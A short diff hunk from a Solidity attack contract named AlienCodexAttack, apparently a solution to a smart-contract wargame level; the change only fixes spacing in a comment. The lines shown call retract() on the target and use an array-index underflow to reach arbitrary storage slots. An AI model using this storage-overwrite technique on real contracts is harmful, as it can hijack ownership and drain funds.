@@ -15,7 +15,7 @@ contract AlienCodexAttack {
         _target.retract();
 
         // Calculating index of the slot which stores first element of codex array
-        // (slot with index 1 stores codex array header )
+        // (slot with index 1 stores codex array header)
         uint256 _slotIndex = uint256(keccak256(abi.encode(1)));
         // Underflow
         uint256 _index = 0 - _slotIndex;
